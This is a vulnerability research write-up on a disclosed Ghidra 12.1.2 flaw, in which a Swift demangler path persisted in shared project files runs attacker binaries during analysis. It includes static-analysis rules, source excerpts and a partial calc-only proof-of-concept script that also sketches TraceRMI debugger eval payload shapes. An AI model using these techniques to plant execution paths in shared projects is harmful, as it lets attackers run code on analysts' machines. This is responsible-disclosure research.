---
description: >-
  CVE-2026-18718 · GHSA-pcfh-853f-q3gh · Ghidra 12.1.2 · Conditional Arbitrary
  Code Execution · CVSS 7.5 High
icon: skull
cover: ../../.gitbook/assets/ChatGPT Image Jul 23, 2026, 03_36_43 PM.png
coverY: 115.41485470331477
coverHeight: 371
---

# How I Found a 0-Day in Ghidra: Shared Project File Became a Code Execution Vector.

### What If Opening Someone Else's Ghidra Project Could Run Code on Your Machine?

In Ghidra 12.1.2, you open a project someone shared with you. A teammate's CTF workspace, a repo from GitHub, a case file from a colleague. Analysis runs. Attacker's binary executes.

No network. No privileges. No prompt, no warning, nothing on screen.

That's the bug. Here's how I found it.

***

### Why I Was Looking at Ghidra

Everyone treats Ghidra as the safe box. You throw malware into it _because_ you don't want to run it. But Ghidra is a 2M-line Java app with hundreds of analyzers firing automatically, and nobody audits the box itself.

I wasn't hunting parser bugs. Too crowded, too much grind. I was hunting **process-launch sinks** — places where Ghidra starts a child process, and where the path to that process comes from somewhere untrusted.

My working directory:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ ls -la
drwxr-xr-x  ghidra-12.1.2/       ← source tree
drwxr-xr-x  research/            ← notes, poc
-rw-r--r--  classification.md
-rw-r--r--  source-evidence.md
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ export GHIDRA_SOURCE=~/BB/GHIDRA/ghidra-12.1.2
```

***

## Recon: Finding the Sinks

#### ripgrep, start dumb

Java has three ways to spawn a process. All greppable.

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ rg -n --type java -e 'new ProcessBuilder\(' -e 'Runtime\.getRuntime\(\)\.exec\(' \
    $GHIDRA_SOURCE -g '!**/test/**' -g '!**/*Test.java' | wc -l
64
```

64 launch sites. For each one the only question that matters: **where does argv\[0] come from?** Hardcoded is boring. User config is mildly interesting. Config that gets **saved inside a file and shipped around** is the jackpot.

#### ast-grep, for what regex misses

Some launches build the command list across multiple lines. `ast-grep` matches on the AST so it catches those.

```yaml
# rules/java-proc-launch.yml
id: java-process-launch-sink
language: java
rule:
  any:
    - pattern: new ProcessBuilder($$$)
    - pattern: Runtime.getRuntime().exec($$$)
    - pattern: $X.command($$$)
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ sg scan -r rules/java-proc-launch.yml $GHIDRA_SOURCE 2>/dev/null | wc -l
102
```

#### Semgrep taint rule, this is what actually found it

Grep shows you sinks. It doesn't tell you if anything untrusted reaches them. In Ghidra, anything read from an `Options` object is program-persisted state so I treated `Options.getString()` as a **source**.

```yaml
# rules/ghidra-option-to-exec.yml
rules:
  - id: ghidra-persisted-option-to-process-launch
    languages: [java]
    severity: ERROR
    mode: taint
    pattern-sources:
      - pattern: $OPTS.getString(...)
      - pattern: $OPTS.getFile(...)
    pattern-sinks:
      - pattern: new ProcessBuilder(...)
      - pattern: Runtime.getRuntime().exec(...)
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ semgrep --config rules/ghidra-option-to-exec.yml \
    $GHIDRA_SOURCE/Ghidra/Features/Base 2>/dev/null
```

```
Findings:
  .../ghidra/app/plugin/core/analysis/SwiftNativeDemangler.java
     ghidra-persisted-option-to-process-launch

Ran 1 rule on 4118 files: 1 finding.
```

One hit. Exactly the shape I wanted.

#### CodeQL, second engine for the report

Semgrep is fast but shallow across methods. CodeQL is slow and deep. Two engines agreeing is what goes in the report.

```ql
module OptionToExecConfig implements DataFlow::ConfigSig {
  predicate isSource(DataFlow::Node src) {
    exists(MethodCall mc |
      mc.getMethod().getDeclaringType().hasName("Options") and
      mc.getMethod().getName().matches("get%") and
      src.asExpr() = mc)
  }
  predicate isSink(DataFlow::Node sink) {
    exists(MethodCall mc |
      mc.getMethod().getDeclaringType().hasName("ProcessBuilder") and
      sink.asExpr() = mc.getAnArgument())
  }
}
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ codeql query run --database=ghidra-db queries/option-exec.ql
```

Same file, same path.

#### Joern, is it even reachable?

A scary function nobody calls is worthless. Walked the call graph backwards from the sink.

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ joern --script - <<'EOF'
importCpg("base.cpg")
cpg.method.name("start").where(_.typeDecl.name("ProcessBuilder"))
   .callIn.repeat(_.caller)(_.maxDepth(6)).name.dedup.l.foreach(println)
EOF
```

It terminates in the analyzer's `added()` the method the analysis manager calls automatically. So normal auto-analysis reaches it. Nobody has to click anything special.

***

### The Surface: Swift Demangler

Swift mangling changes every release, so Ghidra doesn't reimplement it. It shells out to Apple's `swift-demangle`.

Reasonable engineering. Also a process launch with a user-supplied path. The only question left: **who gets to supply it?**

Two files matter:

```
Ghidra/Features/Base/src/main/java/ghidra/app/plugin/core/analysis/SwiftDemanglerAnalyzer.java
Ghidra/Features/Base/src/main/java/ghidra/app/plugin/core/analysis/SwiftNativeDemangler.java
```

***

### Source to Sink

The analyzer reads a configurable tool directory and hands it to the demangler:

```java
// SwiftDemanglerAnalyzer.java
String swiftDir = options.getString(SWIFT_TOOL_DIR_OPTION, null);
SwiftNativeDemangler demangler = new SwiftNativeDemangler(new File(swiftDir));
```

The demangler joins that directory with the tool name and runs it twice:

```java
// SwiftNativeDemangler.java
private File swiftDemanglerPath = new File(swiftToolDir, "swift-demangle");

// SINK 1 — validation probe, fires before any symbol is parsed
new ProcessBuilder(swiftDemanglerPath.getAbsolutePath(), "--version").start();

// SINK 2 — fires again, per symbol, during demangling
new ProcessBuilder(swiftDemanglerPath.getAbsolutePath(), mangled).start();
```

The chain:

<figure><img src="../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

No hash check. No signature check. No allowlisted location. No prompt.

At this point I was still thinking "user misconfiguration." Then I checked where the option actually comes from.

***

## The Real Bug: Silent State Restoration

<figure><img src="../../.gitbook/assets/image (484).png" alt=""><figcaption></figcaption></figure>

Here's the part that changes everything.

```java
// SwiftDemanglerAnalyzer.java
@Override
public void optionsChanged(Options options, Program program) {
    swiftToolDir = options.getString(SWIFT_TOOL_DIR_OPTION, "");
}
```

That `options` object is **program analysis state stored inside the project**. Not a global preference, not something in `~/.ghidra`. It's serialized into the program database and it travels with the file.

So: a shared project carries `SWIFT_TOOL_DIR_OPTION` baked in. You open it, Ghidra silently restores every analyzer option, and the Swift tool directory is now set to the attacker's path without you ever seeing it. Run analysis and their binary runs.

#### Proving it instead of assuming it

I don't put "I believe it persists" in a report. Dumped the options straight out of a program:

```python
# DumpAnalysisOptions.py — Ghidra Jython script
from ghidra.program.model.listing import Program

opts = currentProgram.getOptions(Program.ANALYSIS_PROPERTIES)
for name in sorted(opts.getOptionNames()):
    value = opts.getObject(name, None)
    if value is not None and str(value) != "":
        print("    %-48s = %s" % (name, value))
```

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ $GHIDRA_HOME/support/analyzeHeadless ~/BB/GHIDRA/victim Victim \
    -import ~/BB/GHIDRA/share/target.gzf -noanalysis \
    -scriptPath ~/BB/GHIDRA/scripts -postScript DumpAnalysisOptions.py
```

```
    Demangler GNU                                    = true
    Swift Demangler                                  = true
    Swift Demangler.Swift Tool Dir                   = /tmp/.sn0x-swift/bin
    Non-Returning Functions - Discovered             = true
```

Different project, different user directory, same attacker path. Survived export → transfer → import with zero prompts.

That's where it stopped being misconfiguration and became "the file format carries an execution primitive."

***

## Why It's Actually Exploitable

Being honest: this is not unauthenticated RCE. The victim has to open attacker-supplied project data and analysis has to reach the Swift path.

But RE analysts share projects constantly. CTF teams on a network share, `.gzf` dropped in Slack, research repos on GitHub shipping a project alongside the writeup, university coursework, CI pipelines pulling projects and running `analyzeHeadless`. Nobody audits a project file before opening it, same as nobody audits a `.docx`.

And the attacker controls the binary in the project too. Ship something with Swift-mangled symbols and the demangler path is guaranteed to be walked:

```bash
┌──(sn0x㉿sn0x)-[~/BB/GHIDRA]
└─$ nm -a target.bin | grep -c '^\$s'
147
```

Even that's optional SINK 1 is the `--version` probe, which fires during initialization. Attacker code runs even if demangling never succeeds. The bar is "analysis started."

***

### The PoC: ghostmangle.py

<details>

<summary>ghostmangle.py</summary>

```
#!/usr/bin/env python3
"""Ghidra 12.1.2 code-execution research framework (responsible-disclosure edition).

This is a *single-entrypoint* consolidation of the fragmented research scripts
that were produced while reviewing Ghidra 12.1.2 for code-execution conditions.
The underlying advisory (Swift demangler execution path) has been accepted and
fixed upstream; this tool exists so the research can be *published alongside the
advisory* in a form a reviewer can read, audit, and reproduce in one pass.

Design intent
-------------
The tool orchestrates three independent research components, each mapping to one
reviewed surface:

  * ``SwiftAnalyzer``  -> conditional ACE via the Swift demangler process-launch
                          sink (the accepted advisory). Simulated with a local
                          fake ``swift-demangle`` so no Ghidra install is needed.
  * ``TraceManager``   -> conditional RCE via TraceRMI debugger-agent command /
                          eval sinks. Source-evidence + calc-only payload shapes.
  * ``SevenZipProbe``  -> RCE-class native archive parser reachability
                          (SevenZipJBinding). Benign source-reachability only.

Why a class per surface instead of one procedure: each surface has a different
precondition and a different classification (see ``docs/classification.md``).
Keeping them modular lets the report state each claim precisely instead of
collapsing three distinct risk levels into one.

Safety posture
--------------
Nothing destructive, nothing networked. Every process launch is opt-in:
``--execute`` is required to run any local binary, and ``--launch-calc`` is
required before the benign platform calculator is ever spawned. The calculator
is the traditional harmless "arbitrary process executed" marker.

Author: sn0x-sharma
"""

from __future__ import annotations

import argparse
import logging
import os
import platform
import shutil
import subprocess
import sys
import zipfile
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import ClassVar, Optional, Sequence

# --------------------------------------------------------------------------- #
# Module constants
# --------------------------------------------------------------------------- #

AUTHOR = "sn0x-sharma"
TOOL_VERSION = "2.0.0"
MIN_PYTHON = (3, 9)

LOG = logging.getLogger("ghidra_research")


# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #

def configure_logging(verbose: bool) -> None:
    """Install a single stderr handler with timestamps.

    Logs go to stderr so that machine-readable artifacts written to disk stay
    the authoritative output; the console stream is purely operator narration.
    """
    handler = logging.StreamHandler(stream=sys.stderr)
    handler.setFormatter(
        logging.Formatter(
            fmt="%(asctime)s | %(levelname)-7s | %(message)s",
            datefmt="%H:%M:%S",
        )
    )
    LOG.handlers.clear()
    LOG.addHandler(handler)
    LOG.setLevel(logging.DEBUG if verbose else logging.INFO)


def stage(message: str) -> None:
    """Log a top-level workflow stage in a consistent, greppable form."""
    LOG.info("== %s ==", message)


# --------------------------------------------------------------------------- #
# Platform layer  (replaces the old calc_helper module)
# --------------------------------------------------------------------------- #

@dataclass(frozen=True)
class PlatformProfile:
    """All operating-system branching, resolved once and shared.

    Every component consults this object instead of calling
    ``platform.system()`` itself. Centralising it means the calc command,
    script header, executable-bit handling, and demangler filename all agree on
    a single detected platform for the whole run (deterministic behaviour).
    """

    system: str  # normalised, lower-case: "windows" | "darwin" | "linux" | ...

    # ClassVar, not a field: candidate Linux calculators are a shared constant,
    # so they must stay out of the generated __init__ / repr.
    _LINUX_CALCS: ClassVar[tuple[str, ...]] = (
        "xcalc",
        "gnome-calculator",
        "kcalc",
        "qalculate-gtk",
    )

    @classmethod
    def detect(cls) -> "PlatformProfile":
        """Build a profile from the running host."""
        return cls(system=platform.system().lower())

    # -- predicates -------------------------------------------------------- #
    @property
    def is_windows(self) -> bool:
        return self.system == "windows"

    @property
    def is_macos(self) -> bool:
        return self.system == "darwin"

    # -- Swift demangler simulation --------------------------------------- #
    @property
    def demangler_filename(self) -> str:
        """Name Ghidra would launch inside the configured Swift tool directory.

        A ``.cmd`` on Windows so the fake tool is directly executable there.
        """
        return "swift-demangle.cmd" if self.is_windows else "swift-demangle"

    @property
    def script_header(self) -> str:
        """Shebang / batch header for the generated fake demangler."""
        return "@echo off\n" if self.is_windows else "#!/bin/sh\n"

    def mark_executable(self, path: Path) -> None:
        """Set the executable bit (POSIX only; Windows keys off extension)."""
        if self.is_windows:
            return
        mode = path.stat().st_mode
        path.chmod(mode | 0o111)

    # -- calculator (benign "arbitrary process" marker) ------------------- #
    def calc_argv(self) -> Optional[list[str]]:
        """Return an argv that launches the platform calculator, or None.

        On Linux the first calculator actually present on ``PATH`` wins; if none
        is installed we return None and callers fall back to the disk marker as
        proof of execution.
        """
        if self.is_windows:
            return ["calc.exe"]
        if self.is_macos:
            return ["open", "-a", "Calculator"]
        for name in self._LINUX_CALCS:
            resolved = shutil.which(name)
            if resolved:
                return [resolved]
        return None

    def calc_shell_command(self) -> str:
        """Shell one-liner form, used inside generated scripts / payload shapes."""
        if self.is_windows:
            return "calc.exe"
        if self.is_macos:
            return "open -a Calculator"
        return " || ".join(self._LINUX_CALCS)

    def calc_python_eval_expression(self) -> str:
        """A calc-only Python expression, matching the LLDB ``pyeval`` sink shape."""
        if self.is_windows:
            args = "['calc.exe']"
        elif self.is_macos:
            args = "['open', '-a', 'Calculator']"
        else:
            args = f"['sh', '-lc', {self.calc_shell_command()!r}]"
        return f"__import__('subprocess').Popen({args})"

    def launch_calc(self) -> bool:
        """Spawn the platform calculator detached. True if a command was found."""
        argv = self.calc_argv()
        if argv is None:
            return False
        kwargs: dict = {}
        if self.is_windows:
            kwargs["creationflags"] = getattr(
                subprocess, "CREATE_NEW_PROCESS_GROUP", 0
            )
        subprocess.Popen(
            argv,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            **kwargs,
        )
        return True


# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #

@dataclass
class ResearchConfig:
    """Immutable-ish run configuration derived from the CLI.

    ``ghidra_source`` is optional because the Swift ACE component is fully
    self-contained (it fabricates its own fake tool), whereas the TraceRMI and
    SevenZip components need a real 12.1.2 source tree to produce evidence.
    """

    modes: tuple[str, ...]
    ghidra_source: Optional[Path]
    artifacts_dir: Path
    execute: bool
    launch_calc: bool
    create_harmless_zip: bool
    verbose: bool

    # ClassVar, not a field: the canonical mode order (deterministic, ACE
    # advisory first) is a shared constant, not per-instance configuration.
    ALL_MODES: ClassVar[tuple[str, ...]] = ("swift", "tracermi", "sevenzip")

    @staticmethod
    def resolve_source(explicit: Optional[Path]) -> Optional[Path]:
        """Locate a Ghidra 12.1.2 source tree.

        Precedence: explicit ``--ghidra-source`` > ``GHIDRA_SOURCE`` env >
        ``./ghidra-12.1.2`` > a sibling ``ghidra-12.1.2`` next to this repo.
        Returns the first path that exists, else None. This single resolver
        replaces the copy-pasted ``default_source()`` that lived in two scripts.
        """
        candidates: list[Path] = []
        if explicit:
            candidates.append(explicit)
        env_source = os.environ.get("GHIDRA_SOURCE")
        if env_source:
            candidates.append(Path(env_source))
        here = Path(__file__).resolve()
        candidates.append(Path.cwd() / "ghidra-12.1.2")
        candidates.append(here.parent / "ghidra-12.1.2")
        candidates.append(here.parent.parent / "ghidra-12.1.2")
        for candidate in candidates:
            if candidate.exists():
                return candidate.resolve()
        return None


# --------------------------------------------------------------------------- #
# Result model
# --------------------------------------------------------------------------- #

class Status(Enum):
    """Outcome of a single component run."""

    PASS = "pass"          # component executed and produced its expected evidence
    PARTIAL = "partial"    # ran, but some expected evidence was missing
    SKIPPED = "skipped"    # prerequisites not met (e.g. no source tree)
    ERROR = "error"        # unexpected failure


@dataclass
class ComponentResult:
    """Structured result returned by every research component.

    Components return data rather than printing; ``ReportGenerator`` owns all
    presentation. This is what makes the summary deterministic and lets the
    runner compute a meaningful process exit code.
    """

    name: str
    status: Status
    summary: str
    findings: list[str] = field(default_factory=list)
    artifacts: list[Path] = field(default_factory=list)


# --------------------------------------------------------------------------- #
# Evidence handling
# --------------------------------------------------------------------------- #

@dataclass
class SourceHit:
    """A single source-evidence match: ``relative_path:line`` and the text."""

    path: Path
    line: int
    needle: str
    text: str


class SourceScanner:
    """Read-only substring scanner over a Ghidra source tree.

    Consolidates the two different grep implementations the old scripts carried:
    a fixed-path lookup (SevenZip) and a recursive glob lookup (TraceRMI). Both
    now come from one audited primitive that reports 1-based line numbers.
    """

    def __init__(self, root: Path) -> None:
        self.root = root

    def locate(self, relative_path: str, needle: str) -> Optional[SourceHit]:
        """Find the first occurrence of ``needle`` in a specific file."""
        path = self.root / relative_path
        if not path.exists():
            return None
        text = path.read_text(encoding="utf-8", errors="replace")
        index = text.find(needle)
        if index < 0:
            return None
        line = text.count("\n", 0, index) + 1
        return SourceHit(Path(relative_path), line, needle, needle)

    def scan_glob(
        self,
        subdir: str,
        filename_glob: str,
        needles: Sequence[str],
    ) -> list[SourceHit]:
        """Recursively scan ``subdir`` for files matching ``filename_glob``.

        Returns every line containing any needle, sorted for deterministic
        output regardless of filesystem enumeration order.
        """
        base = self.root / subdir
        if not base.exists():
            raise FileNotFoundError(f"Expected source subtree not found: {base}")
        hits: list[SourceHit] = []
        for source_file in base.rglob(filename_glob):
            try:
                lines = source_file.read_text(
                    encoding="utf-8", errors="replace"
                ).splitlines()
            except OSError:
                continue
            for line_no, raw in enumerate(lines, start=1):
                stripped = raw.strip()
                for needle in needles:
                    if needle in stripped:
                        hits.append(
                            SourceHit(
                                source_file.relative_to(self.root),
                                line_no,
                                needle,
                                stripped,
                            )
                        )
        return sorted(hits, key=lambda h: (str(h.path), h.line, h.needle))


class EvidenceCollector:
    """Owns the ``artifacts/`` tree and records everything written to it.

    Separating evidence output from the components keeps generated artifacts
    cleanly out of source control (the whole tree is git-ignored) and gives the
    report a single, ordered list of produced files.
    """

    def __init__(self, root: Path) -> None:
        self.root = root
        self._artifacts: list[Path] = []

    def _subdir(self, name: str) -> Path:
        path = self.root / name
        path.mkdir(parents=True, exist_ok=True)
        return path

    def write_text(self, subdir: str, filename: str, content: str) -> Path:
        """Write a UTF-8 text artifact and remember it."""
        path = self._subdir(subdir) / filename
        if not content.endswith("\n"):
            content += "\n"
        path.write_text(content, encoding="utf-8")
        self.register(path)
        return path

    def create_harmless_zip(self, subdir: str, filename: str) -> Path:
        """Emit a benign ZIP used to exercise the archive-parser reachability.

        Deliberately contains one plain text file — no crafted headers, no
        exploit bytes — so it is safe to hand to any parser.
        """
        path = self._subdir(subdir) / filename
        with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(
                "hello.txt",
                "harmless sample for parser reachability checks\n",
            )
        self.register(path)
        return path

    def register(self, path: Path) -> None:
        """Record an artifact so the report can list it.

        Public because some artifacts are authored *outside* this collector —
        e.g. the fake Swift demangler writes its own marker — and still need to
        appear in the run summary. Idempotent: a path is recorded at most once.
        """
        if path not in self._artifacts:
            self._artifacts.append(path)
            LOG.debug("artifact written: %s", path)

    @property
    def artifacts(self) -> list[Path]:
        """All artifacts written this run, in creation order."""
        return list(self._artifacts)


# --------------------------------------------------------------------------- #
# Research components
# --------------------------------------------------------------------------- #

class ResearchComponent:
    """Base contract for a reviewed-surface component.

    ``requires_source`` lets the runner skip source-dependent components (and
    say why) when no Ghidra tree is available, instead of crashing.
    """

    name: str = "component"
    requires_source: bool = False

    def __init__(
        self,
        config: ResearchConfig,
        profile: PlatformProfile,
        evidence: EvidenceCollector,
        scanner: Optional[SourceScanner],
    ) -> None:
        self.config = config
        self.profile = profile
        self.evidence = evidence
        self.scanner = scanner

    def run(self) -> ComponentResult:  # pragma: no cover - interface method
        """Execute the component and return its structured result."""
        raise NotImplementedError


class SwiftAnalyzer(ResearchComponent):
    """Conditional ACE — the accepted Swift demangler advisory.

    Ghidra's Swift demangler analyzer restores a configured Swift tool directory
    and launches ``swift-demangle`` from it (once at validation with
    ``--version``, and again during symbol demangling). If that directory
    resolves to attacker-controlled content, Ghidra runs attacker code in the
    user's context.

    This component reproduces the *sink shape* without needing Ghidra: it writes
    a fake ``swift-demangle`` into a fake tool directory and, under ``--execute``,
    invokes it exactly as Ghidra would (``swift-demangle --version``). The fake
    tool drops a marker proving it ran; under ``--launch-calc`` the fake tool is
    the thing that spawns the calculator — because in the real bug the attacker
    binary is what executes, so the attacker binary is what should pop calc.
    """

    name = "swift-ace"
    requires_source = False

    def run(self) -> ComponentResult:
        """Stage the fake Swift tool and, under ``--execute``, launch it."""
        tool_dir = self.evidence.root / "swift-demangler-calc" / "fake-swift-bin"
        tool_dir.mkdir(parents=True, exist_ok=True)
        marker = (
            self.evidence.root
            / "swift-demangler-calc"
            / "swift_demangler_calc_marker.txt"
        )
        fake_tool = tool_dir / self.profile.demangler_filename

        self._write_fake_demangler(fake_tool, marker)

        findings = [
            f"Fake Swift tool directory: {tool_dir}",
            f"Fake demangler: {fake_tool}",
            "Simulated Ghidra launch: swift-demangle --version",
        ]

        if not self.config.execute:
            LOG.info("swift-ace: dry run (pass --execute to launch the fake tool)")
            return ComponentResult(
                name=self.name,
                status=Status.PASS,
                summary="Fake Swift demangler staged; not executed (dry run).",
                findings=findings,
                artifacts=[fake_tool],
            )

        LOG.info("swift-ace: launching fake demangler as Ghidra would")
        try:
            subprocess.run([str(fake_tool), "--version"], check=True)
        except (OSError, subprocess.CalledProcessError) as exc:
            return ComponentResult(
                name=self.name,
                status=Status.ERROR,
                summary=f"Fake demangler failed to execute: {exc}",
                findings=findings,
            )

        if not marker.exists():
            return ComponentResult(
                name=self.name,
                status=Status.PARTIAL,
                summary="Fake demangler ran but did not drop its marker.",
                findings=findings,
                artifacts=[fake_tool],
            )
        self.evidence.register(marker)  # marker is authored by the fake tool
        findings.append(f"Execution marker: {marker}")

        if self.config.launch_calc:
            findings.append("Fake tool requested platform calculator launch.")

        return ComponentResult(
            name=self.name,
            status=Status.PASS,
            summary="Swift demangler sink reproduced; attacker binary executed.",
            findings=findings,
            artifacts=[fake_tool, marker],
        )

    def _write_fake_demangler(self, fake_tool: Path, marker: Path) -> None:
        """Generate the stand-in ``swift-demangle`` executable.

        It echoes a banner, records the arguments Ghidra passed (proof of
        launch), and — only when calc is enabled — spawns the calculator so the
        launch is visibly demonstrated by the attacker-controlled tool itself.
        """
        lines = [self.profile.script_header]
        if self.profile.is_windows:
            lines.append("echo Swift demangler calc PoC (sn0x-sharma)\n")
            lines.append(f'echo ran with: %* > "{marker}"\n')
            if self.config.launch_calc:
                lines.append("start \"\" calc.exe\n")
        else:
            lines.append("echo 'Swift demangler calc PoC (sn0x-sharma)'\n")
            lines.append(f'printf "ran with: %s\\n" "$*" > "{marker}"\n')
            if self.config.launch_calc:
                lines.append(f"({self.profile.calc_shell_command()}) &\n")
        fake_tool.write_text("".join(lines), encoding="utf-8")
        self.profile.mark_executable(fake_tool)


class TraceManager(ResearchComponent):
    """Conditional RCE — TraceRMI debugger-agent command/eval sinks.

    The TraceRMI debugger agents expose methods that reach a command interpreter
    or a Python ``eval``:

      * GDB  ``execute(cmd)``  -> ``gdb.execute(cmd, ...)``
      * LLDB ``execute(cmd)``  -> LLDB command interpreter
      * LLDB ``pyeval(expr)``  -> Python ``eval(expr)``

    Once an untrusted peer can drive an already-created agent channel, those
    become code execution in the agent context. This component proves the sinks
    exist in the target source and emits *calc-only* payload shapes for the
    write-up. It never opens a channel or sends a command; the payload shapes are
    documentation, not a live exploit.
    """

    name = "tracermi-rce"
    requires_source = True

    _SINK_PATTERNS: tuple[str, ...] = (
        "def execute(",
        "gdb.execute(cmd",
        "exec_convert_errors(cmd",
        "def pyeval(",
        "return eval(expr)",
        "EvaluateExpression(expr)",
    )

    def run(self) -> ComponentResult:
        """Scan agent ``methods.py`` for exec/eval sinks and emit payload shapes."""
        assert self.scanner is not None  # guaranteed by requires_source gate
        LOG.info("tracermi-rce: scanning Ghidra/Debug for agent sinks")
        try:
            hits = self.scanner.scan_glob("Ghidra/Debug", "methods.py", self._SINK_PATTERNS)
        except FileNotFoundError as exc:
            return ComponentResult(
                name=self.name,
                status=Status.SKIPPED,
                summary=str(exc),
            )

        if not hits:
            return ComponentResult(
                name=self.name,
                status=Status.PARTIAL,
                summary="No execution-capable TraceRMI agent sinks were found.",
            )

        findings = [f"{h.path}:{h.line}: {h.text}" for h in hits]

        shapes = self._payload_shapes()
        shapes_artifact = self.evidence.write_text(
            "tracermi-conditional-rce",
            "tracermi_calc_payload_shapes.txt",
            "\n".join(shapes),
        )
        artifacts = [shapes_artifact]

        if self.config.execute and self.config.launch_calc:
            marker = self.evidence.write_text(
                "tracermi-conditional-rce",
                "tracermi_local_calc_marker.txt",
                "local calc demo ran",
            )
            artifacts.append(marker)
            if self.profile.launch_calc():
                findings.append("Local calculator launched as sink demonstration.")
            else:
                findings.append("No calculator found; marker proves local execution.")

        return ComponentResult(
            name=self.name,
            status=Status.PASS,
            summary=f"Found {len(hits)} TraceRMI execution-capable sink line(s).",
            findings=findings,
            artifacts=artifacts,
        )

    def _payload_shapes(self) -> list[str]:
        """Calc-only command shapes, one per confirmed sink type."""
        shell = self.profile.calc_shell_command()
        return [
            f"GDB execute(cmd) calc-only command: shell {shell}",
            f"LLDB execute(cmd) calc-only command: platform shell {shell}",
            f"LLDB pyeval(expr) calc-only expression: "
            f"{self.profile.calc_python_eval_expression()}",
        ]


class SevenZipProbe(ResearchComponent):
    """RCE-class native parser reachability — SevenZipJBinding.

    Ghidra 12.1.2 bundles SevenZipJBinding 16.02-era native code and routes
    recognised archive bytes into it in-process. This is an RCE-*class* surface
    (reverse engineers routinely open untrusted archives/firmware), but this
    component makes no code-execution claim: it only proves the source-level
    reachability chain and, optionally, emits a benign ZIP plus a pointer to the
    optional JVM runtime probe.
    """

    name = "sevenzip-reachability"
    requires_source = True

    # (label, relative source path, substring that proves the link)
    _CHECKS: tuple[tuple[str, str, str], ...] = (
        (
            "SevenZipJBinding dependency",
            "Ghidra/Features/FileFormats/build.gradle",
            "sevenzipjbinding:16.02-2.01",
        ),
        (
            "SevenZip all-platforms dependency",
            "Ghidra/Features/FileFormats/build.gradle",
            "sevenzipjbinding-all-platforms:16.02-2.01",
        ),
        (
            "Archive probe path",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipFileSystemFactory.java",
            "probeStartBytes",
        ),
        (
            "SevenZip file system mount",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipFileSystemFactory.java",
            "new SevenZipFileSystem",
        ),
        (
            "Native archive open",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipFileSystem.java",
            "SevenZip.openInArchive",
        ),
        (
            "Native library load",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "sevenzip/SevenZipCustomInitializer.java",
            "System.load",
        ),
        (
            "ZIP tries SevenZip path",
            "Ghidra/Features/FileFormats/src/main/java/ghidra/file/formats/"
            "zip/ZipFileSystemFactory.java",
            "SevenZipFileSystemFactory.initNativeLibraries",
        ),
    )

    def run(self) -> ComponentResult:
        """Confirm the source-level native-parser reachability chain."""
        assert self.scanner is not None
        LOG.info("sevenzip-reachability: verifying native parser reachability chain")

        findings: list[str] = []
        missing = 0
        for label, rel_path, needle in self._CHECKS:
            hit = self.scanner.locate(rel_path, needle)
            if hit is None:
                findings.append(f"[miss]  {label}: {rel_path}")
                missing += 1
            else:
                findings.append(f"[found] {label}: {hit.path}:{hit.line}")

        artifacts: list[Path] = []
        if self.config.create_harmless_zip:
            sample = self.evidence.create_harmless_zip(
                "sevenzip-reachability", "harmless-sevenzip-sample.zip"
            )
            artifacts.append(sample)
            findings.append(f"Benign ZIP sample: {sample}")

        probe = Path(__file__).resolve().parent / "probes" / "SevenZipReachabilityProbe.java"
        if probe.exists():
            findings.append(f"Optional JVM runtime probe available: {probe}")

        if missing:
            return ComponentResult(
                name=self.name,
                status=Status.PARTIAL,
                summary=f"{len(self._CHECKS) - missing}/{len(self._CHECKS)} "
                "reachability links confirmed.",
                findings=findings,
                artifacts=artifacts,
            )
        return ComponentResult(
            name=self.name,
            status=Status.PASS,
            summary="Full SevenZipJBinding native-parser reachability chain confirmed.",
            findings=findings,
            artifacts=artifacts,
        )


# --------------------------------------------------------------------------- #
# Environment validation
# --------------------------------------------------------------------------- #

@dataclass
class EnvironmentReport:
    """Outcome of pre-flight validation."""

    ok: bool
    notes: list[str] = field(default_factory=list)


class EnvironmentValidator:
    """Pre-flight checks run before any component executes.

    Fails fast and loudly on hard blockers (Python version), and records soft
    notes (missing source tree, no calculator installed) so the operator learns
    up front why a mode will be skipped or why calc launch may no-op.
    """

    def __init__(self, config: ResearchConfig, profile: PlatformProfile) -> None:
        self.config = config
        self.profile = profile

    def validate(self, components: Sequence[ResearchComponent]) -> EnvironmentReport:
        stage("validating environment")
        report = EnvironmentReport(ok=True)

        if sys.version_info < MIN_PYTHON:
            report.ok = False
            report.notes.append(
                f"Python {MIN_PYTHON[0]}.{MIN_PYTHON[1]}+ required, "
                f"found {sys.version_info.major}.{sys.version_info.minor}."
            )
            LOG.error(report.notes[-1])
            return report

        LOG.debug("Python %s on %s", platform.python_version(), self.profile.system)

        needs_source = any(c.requires_source for c in components)
        if needs_source:
            if self.config.ghidra_source is None:
                note = (
                    "No Ghidra 12.1.2 source tree found; source-dependent modes "
                    "(tracermi, sevenzip) will be skipped. Pass --ghidra-source "
                    "or set GHIDRA_SOURCE."
                )
                report.notes.append(note)
                LOG.warning(note)
            else:
                LOG.info("Ghidra source: %s", self.config.ghidra_source)

        if self.config.launch_calc and self.profile.calc_argv() is None:
            note = (
                "No platform calculator on PATH; calc launch will no-op "
                "(markers still prove execution)."
            )
            report.notes.append(note)
            LOG.warning(note)

        return report


# --------------------------------------------------------------------------- #
# Reporting
# --------------------------------------------------------------------------- #

class ReportGenerator:
    """Renders the final summary to the log and to a text artifact.

    Presentation lives here (and only here) so component output stays pure data
    and the summary is deterministic across runs and platforms.
    """

    def __init__(self, evidence: EvidenceCollector) -> None:
        self.evidence = evidence

